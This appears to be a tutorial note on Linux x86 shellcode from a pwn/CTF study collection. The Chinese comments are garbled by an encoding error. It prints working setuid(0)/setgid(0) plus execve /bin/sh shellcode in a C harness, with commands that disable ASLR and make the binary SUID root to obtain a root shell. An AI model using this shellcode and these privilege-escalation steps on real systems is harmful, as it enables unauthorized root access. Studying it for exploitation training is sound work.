shellcode
===
ğŸ”™ [MENU README](../PWN.md#challenge)

# Environment
Source
```C
#include<stdlib.h>
#include<stdio.h>

const char code[] = 
  "\x6a\x17"		// push	$0x17
  "\x58"			  // pop 	%eax
  "\x31\xdb"		// xor	%ebx, %ebx
  "\xcd\x80"		// int	$0x80

  // "\x6a\x2e"		// push	$0x2e	
  // "\x58"			  // pop	%eax
  // "\x53"			  // push %ebx
  // "\xcd\x80"		// int	$0x80

  "\x31\xc0"			 // xorl	%eax, %eax
  "\x50"           // pushl %eax
  "\x68""//sh"     // pushl	%eax
  "\x68""/bin"	   // pushl
  "\x89\xe3"       // movl  %esp,%ebx
  "\x50"           // pushl %eax
  "\x53"           // pushl %ebx
  "\x89\xe1"       // movl  %esp,%ecx
  "\x99"           // cdq
  "\xb0\x0b"       // movb $0x0b,%al 
  "\xcd\x80"       // int $0x80
;

int main(int argc, char **argv){
  char buf[sizeof(code)];
  strcpy(buf, code);
  ((void(*)())buf)();
}
```
Compile
```bash
gcc shellcode.c -z execstack -o shellcode
```
```bash
# ASLR è®“ libcè¼‰å…¥ä½ç½®æ¯æ¬¡éƒ½ä¸åŒ
ldd Downloads/crackme0x00a | grep libc

# ASLR setting
sysctl -a --pattern randomize

# Disable ASLE
sudo sysctl -w kernel.randomize_va_space=0
```
# Shell
```bash
# ~/example/samplecode/shellcode.c
gcc shellcode.c -z execstack -o shellcode
./shellcode
# å¯ä»¥é–‹å•Ÿshell

# Owner
sudo chown root:root shellcode
# SUID
sudo chmod 4755 shellcode

./shellcode # æœƒç™¼ç¾ä¸¦æ²’æœ‰å¾—åˆ°root
```
Shellå¸¸è­˜
```
1. Linuxæœ‰ä¸‰ç¨®shell : dashã€bashã€zsh
2. /bin/shåˆ°åº•æ˜¯å“ªç¨®shell => dash(è¼•è–„çŸ­å°)
   ll /bin/sh
3. Linuxä¸­ä¿è­·æ©Ÿåˆ¶ : ruid(real) != euid(effective)æ™‚æœƒdrop permissionåˆ°ä½æ¬Šé™
```
shellcode.cåŠ æ–™
```bash
# https://shell-storm.org/shellcode/files/shellcode-251.html


# setuid = 0 
  "\x6a\x17"		// push	$0x17
  "\x58"			  // pop 	%eax
  "\x31\xdb"		// xor	%ebx, %ebx
  "\xcd\x80"		// int	$0x80


# setgid = 0
  "\x6a\x2e"		// push	$0x2e	
  "\x58"			  // pop	%eax
  "\x53"			  // push %ebx
  "\xcd\x80"		// int	$0x80

# å°å¸¸è­˜ å¦‚ä½•åˆ¤æ–·ä¸€æ®µcodeå¾ˆé«˜çš„æ©Ÿæœƒæ˜¯shellcode
\xcd\x80 å¤§é‡å‡ºç¾çš„æ™‚å€™ï¼Œå› ç‚ºå®ƒä»£è¡¨callæŒ‡ä»¤


# è©¦çœ‹çœ‹ä¿®æ­£éå¾Œçš„shellcode
sudo gcc shellcode.c -z execstack -o shellcode
chmod 4755 shellcode
./shellcode
```